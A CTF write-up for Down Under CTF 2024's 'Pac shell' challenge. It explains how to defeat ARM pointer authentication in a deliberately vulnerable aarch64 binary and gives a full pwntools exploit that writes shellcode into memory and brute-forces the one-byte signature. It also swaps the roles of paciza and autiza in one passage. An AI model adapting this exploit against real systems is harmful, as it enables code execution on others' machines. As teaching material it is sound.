---
id: index
title: Pac shell writeup
description: Writeup for challenge "Pac shell" of Down Under CTF 2024
---

## Prologue

Difficulty: easy

Category: binary exploitation

Solved: 55

!!! quote "Description"
    Welcome to pac shell v0.0.1. You have arbitrary read and write, please turn this into arbitrary code execution!

Input files:

??? info "pacsh.c"
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    
    typedef struct {
        char name[8];
        void (*fptr)();
    } builtin_func;
    
    void ls() {
        system("ls");
    }
    
    void read64() {
        unsigned long* addr;
        printf("read64> ");
        scanf("%p", &addr);
        printf("%8lx\n", *addr);
    }
    
    void write64() {
        unsigned long* addr;
        unsigned long val;
        printf("write64> ");
        scanf("%p %lx", &addr, &val);
        *addr = val;
    }
    
    void help();
    builtin_func BUILTINS[4] = {
        { .name = "help", .fptr = help },
        { .name = "ls", .fptr = ls },
        { .name = "read64", .fptr = read64 },
        { .name = "write64", .fptr = write64 },
    };
    
    void help() {
        void (*f)();
        for(int i = 0; i < 4; i++) {
            f = BUILTINS[i].fptr;
            __asm__("paciza %0\n" : "=r"(f) : "r"(f));
            printf("%8s: %p\n", BUILTINS[i].name, f);
        }
    }
    
    int main() {
        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
    
        void (*fptr)() = NULL;
    
        puts("Welcome to pac shell v0.0.1");
        help();
    
        while(1) {
            printf("pacsh> ");
            scanf("%p", &fptr);
            __asm__("autiza %0\n" : "=r"(fptr) : "r"(fptr));
            (*fptr)();
        }
    }
    ```

??? info "Dockerfile"
    ```dockerfile
    FROM ghcr.io/downunderctf/docker-vendor/nsjail:ubuntu-22.04
    
    ENV DEBIAN_FRONTEND=noninteractive
    RUN apt-get update \
        && apt-get install -y gcc-aarch64-linux-gnu qemu-user qemu-user-static --fix-missing \
        && rm -r /var/lib/apt/lists/*
    
    ENV JAIL_CWD=/chal
    
    COPY ./flag.txt /home/ctf/chal
    COPY ./ld-linux-aarch64.so.1 /home/ctf/chal
    COPY ./libc.so.6 /home/ctf/chal
    COPY ./pacsh /home/ctf/chal
    COPY ./run.sh /home/ctf/chal/pwn
    ```

* [pac_shell.tar.gz](https://github.com/DownUnderCTF/Challenges_2024_Public/blob/f2797a33d8f5851508f37e854afceedf85eee8a3/pwn/pac-shell/publish/pac_shell.tar.gz) - also includes binary, libc and ld, run.sh

NB:


* Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by **number**, 0-based index implied. 
 
  Ie, element `0` of list `[1, 2, 4, 8, 16]` is `1`, Element `3` is `8`.
  
  When element is reference in explanation with **word** (first, third...), 1-based system is implied.

  Ie, first character of string `Hello World!` is `H`, fifth is `o`.

* Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure.

* I am using gdb with [pwndbg](https://github.com/pwndbg/pwndbg) plugin

## My struggle

### Analysis

First thing that I like to do is to inspect environment we deal with:

```bash title="run.sh"
#!/bin/sh

qemu-aarch64 pacsh
```

So, the binary is aarch64 and is running under emulation.

```dockerfile title="Dockerfile"
FROM ghcr.io/downunderctf/docker-vendor/nsjail:ubuntu-22.04

ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update \
    && apt-get install -y gcc-aarch64-linux-gnu qemu-user qemu-user-static --fix-missing \
    && rm -r /var/lib/apt/lists/*
    
ENV JAIL_CWD=/chal
    
COPY ./flag.txt /home/ctf/chal
COPY ./ld-linux-aarch64.so.1 /home/ctf/chal
COPY ./libc.so.6 /home/ctf/chal
COPY ./pacsh /home/ctf/chal
COPY ./run.sh /home/ctf/chal/pwn
```

There are 5 files in the container, and entrypoint command (`JAL_CWD`) is `/chal`. Flag is in `/home/ctf/chal`.

Now its time to focus on the application itself:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char name[8];
    void (*fptr)();
} builtin_func;

void ls() {
    system("ls");
}

void read64() {
    unsigned long* addr;
    printf("read64> ");
    scanf("%p", &addr);
    printf("%8lx\n", *addr);
}

void write64() {
    unsigned long* addr;
    unsigned long val;
    printf("write64> ");
    scanf("%p %lx", &addr, &val);
    *addr = val;
}

void help();
builtin_func BUILTINS[4] = {
    { .name = "help", .fptr = help },
    { .name = "ls", .fptr = ls },
    { .name = "read64", .fptr = read64 },
    { .name = "write64", .fptr = write64 },
};

void help() {
    void (*f)();
    for(int i = 0; i < 4; i++) {
        f = BUILTINS[i].fptr;
        __asm__("paciza %0\n" : "=r"(f) : "r"(f));
        printf("%8s: %p\n", BUILTINS[i].name, f);
    }
}

int main() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    void (*fptr)() = NULL;

    puts("Welcome to pac shell v0.0.1");
    help();

    while(1) {
        printf("pacsh> ");
        scanf("%p", &fptr);
        __asm__("autiza %0\n" : "=r"(fptr) : "r"(fptr));
        (*fptr)();
    }
}
```

There are 4 functions: `ls`, `read64`, `write64`, `help`. Main is a loop that reads address from user and calls function at 
that address. General ideal here would be:

1. Find writeable address;
2. Write shellcode to that address using write64;
3. Jump to that address from main loop.

Note that application is using AUTIZA/PACIZA instructions for address authentication.
Some details can be found here: http://hehezhou.cn/isa/autia.html , http://hehezhou.cn/isa/pacia.html . Also ChatGPT did a good job explaining.
In a nutshell, this instructions use top bits of a pointer to sign address. For example:

```bash
Welcome to pac shell v0.0.1
   help: 0x01005500000b7c
     ls: 0x78005500000a54
 read64: 0x29005500000a78
write64: 0x15005500000afc
pacsh>
```

We can see `autiza` in action:

* Address `0x5500000b7c` was signed by `autiza` with `0x01` in top bits.
* Address `0x5500000a54` was signed by `autiza` with `0x78` in top bits.
* Address `0x5500000a78` was signed by `autiza` with `0x29` in top bits.
* Address `0x5500000afc` was signed by `autiza` with `0x15` in top bits.

`paciza` is an opposite operation, it converts `0x01005500000b7c` to `0x5500000b7c`.

I've build container locally so I can debug:

```bash
$ ls
Dockerfile  ld-linux-aarch64.so.1  libc.so.6  pacsh  pacsh.c  run.sh
$ echo mytestflag > flag.txt
$ docker build . --tag tmp_container
# -p 1337:1337 is port forwarding --privileged required by application (I guess for virtualization)
$ docker run --rm --name pac_shell --privileged -p 1337:1337 tmp_container
```

### Exploit

First step of our plan is to find out address we can write to. Running application several times I can see that addresses of
functions `ls`, `read64`, `write64` and `help` have different first byte signature, but otherwise are same: 0x..5500000b7c. This
means that application is loaded to the same address every time.

Not I got memory mapping of the process. Functions are located in the first segment, but its not writable. First writeable segment 
I can see is on line 5. That is what we are going to use.

```bash hl_lines="2 5"
$ sudo cat /proc/51526/maps
5500000000-5500001000 r--p 00000000 00:45 1634511                        /chal/pacsh
5500001000-5500011000 ---p 00000000 00:00 0 
5500011000-5500012000 r--p 00001000 00:45 1634511                        /chal/pacsh
5500012000-5500013000 rw-p 00002000 00:45 1634511                        /chal/pacsh
5500013000-5500020000 ---p 00000000 00:00 0 
5500020000-5500021000 rw-p 00010000 00:45 1634511                        /chal/pacsh
5501021000-5501022000 ---p 00000000 00:00 0 
5501022000-5501822000 rw-p 00000000 00:00 0 
5501822000-550184c000 r--p 00000000 00:45 1634475                        /chal/ld-linux-aarch64.so.1
550184c000-550185b000 ---p 00000000 00:00 0 
550185b000-550185d000 r--p 00029000 00:45 1634475                        /chal/ld-linux-aarch64.so.1
550185d000-550185f000 rw-p 0002b000 00:45 1634475                        /chal/ld-linux-aarch64.so.1
550185f000-5501860000 r--p 00000000 00:00 0 
5501860000-5501862000 rw-p 00000000 00:00 0 
5501870000-55019f9000 r--p 00000000 00:45 1634493                        /chal/libc.so.6
55019f9000-5501a08000 ---p 00189000 00:45 1634493                        /chal/libc.so.6
5501a08000-5501a0c000 r--p 00188000 00:45 1634493                        /chal/libc.so.6
5501a0c000-5501a0e000 rw-p 0018c000 00:45 1634493                        /chal/libc.so.6
5501a0e000-5501a1a000 rw-p 00000000 00:00 0 
```

Here is script that generates code and writes it to memory:

```py
# function generates assembly to read flag and writes its to the base_addr
def write_shell_code(base_addr, write64_addr):
    # use pwntools shellcraft to create assembly code for reading file flag.txt and then hang thread forever
    # if process immediately crashes/exists we won't get contents of the flag sent to us over network
    code = asm(shellcraft.cat("flag.txt") + shellcraft.infloop())

    for i in range(0, len(code), 8): # iterate over code 8 bytes at a time
        # read next 8 bytes to send
        chunk_bytes = code[i:i + 8]
        # pad with 0 (only relevant for the last chunk if number of bytes in code is not mulitple of 8)
        chunk_bytes += bytearray(8 - len(chunk_bytes))
        # convert bytes to big endian and then into hex
        chunk_hex = hex(unpack(chunk_bytes))
        # instruct target application that we want to execute write64
        io.sendline(hex(write64_addr).encode())
        # wait till target application is ready to receive our input
        io.recvuntil(b"write64> ")
        # send address that we want to write too (for each chunk we increase it by i) and value of the chunk
        io.sendline((hex(base_addr + i) + " " + chunk_hex).encode())
        # wait till application executed our write instruction
        io.recvuntil(b"pacsh> ")
```

Now our code is ready and all is left to do is jump there. But we can't just enter base address into the application: it requires
address to be signed. Signature is only 1 byte, so it can be quickly bruteforce it in a loop.

??? success "solve.py"
    ```py
    from pwn import *
    
    context.binary = elfexe = ELF('pacsh')
    libc = elfexe.libc
    
    context.log_level = 'warn'
    
    # function generates assembly to read flag and writes its to the base_addr
    def write_shell_code(base_addr, write64_addr):
        # use pwntools shellcraft to create assembly code for reading file flag.txt and then hang thread forever
        # if process immediately crashes/exists we won't get contents of the flag sent to us over network
        code = asm(shellcraft.cat("flag.txt") + shellcraft.infloop())
    
        for i in range(0, len(code), 8): # iterate over code 8 bytes at a time
            # read next 8 bytes to send
            chunk_bytes = code[i:i + 8]
            # pad with 0 (only relevant for the last chunk if number of bytes in code is not mulitple of 8)
            chunk_bytes += bytearray(8 - len(chunk_bytes))
            # convert bytes to big endian and then into hex
            chunk_hex = hex(unpack(chunk_bytes))
            # instruct target application that we want to execute write64
            io.sendline(hex(write64_addr).encode())
            # wait till target application is ready to receive our input
            io.recvuntil(b"write64> ")
            # send address that we want to write too (for each chunk we increase it by i) and value of the chunk
            io.sendline((hex(base_addr + i) + " " + chunk_hex).encode())
            # wait till application executed our write instruction
            io.recvuntil(b"pacsh> ")
    
    
    # iterate over 0..256 possible signatures
    for i in range(256):
        remote_server = 'localhost'
        remote_port = 1337
        io = remote(remote_server, remote_port)
    
        # parse addresses of the functions from the welcome message
        # Welcome to pac shell v0.0.1
        # help: 0x34005500000b7c
        # ls: 0x9005500000a54
        # read64: 0x2a005500000a78
        # write64: 0x2f005500000afc
        # pacsh>
        io.recvuntil(b"help: 0x")
        help_addr = int(io.recvline(), 16)
        io.recvuntil(b"read64: 0x")
        read64_addr = int(io.recvline(), 16)
        io.recvuntil(b"write64: 0x")
        write64_addr = int(io.recvline(), 16)
        io.recvuntil(b"pacsh> ")
    
        # address of writable segment with 0x100 bytes offset as a precaution
        base_addr = 0x5500012100
        write_shell_code(base_addr, write64_addr)
    
        # append I as a top byte signature to the base address
        jumpAddress = hex(base_addr | int("{:02x}000000000000".format(i), 16))
        # send address to the application
        io.sendline(jumpAddress.encode())
        # read response its either crash info if signature is wrong or flag contents
        line = io.recvline()
        print(line)
        if b"Segmentation fault" not in line: # if its not crash info we got the flag - exit loop
           break
        io.close()
    
    ```



## Epilogue

* Official website: [https://downunderctf.com/](https://downunderctf.com/)
* Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public
